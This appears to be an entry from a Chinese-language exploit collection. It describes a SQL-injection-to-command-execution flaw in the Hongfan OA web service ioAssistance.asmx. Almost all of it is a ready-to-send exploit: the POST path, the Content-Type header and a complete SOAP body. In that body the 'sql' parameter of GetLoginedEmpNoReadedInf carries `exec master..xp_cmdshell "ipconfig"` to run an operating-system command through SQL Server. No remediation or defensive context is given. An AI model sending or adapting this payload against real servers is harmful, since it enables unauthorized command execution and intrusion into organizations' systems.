# 红帆OAioAssistance.asmx注入RCE

- **系统**：红帆OAioAssistance.asmx　|　**类型**：命令执行　|　**CVE**：—
- **请求**：`POST /iOffice/prg/set/wss/ioAssistance.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetLoginedEmpNoReadedInf
xmlns="http://tempuri.org/">
<sql>exec master..xp_cmdshell "ipconfig"</sql>
</GetLoginedEmpNoReadedInf>
</soap:Body>
</soap:Envelope>
```
- **预期**：200　|　Windows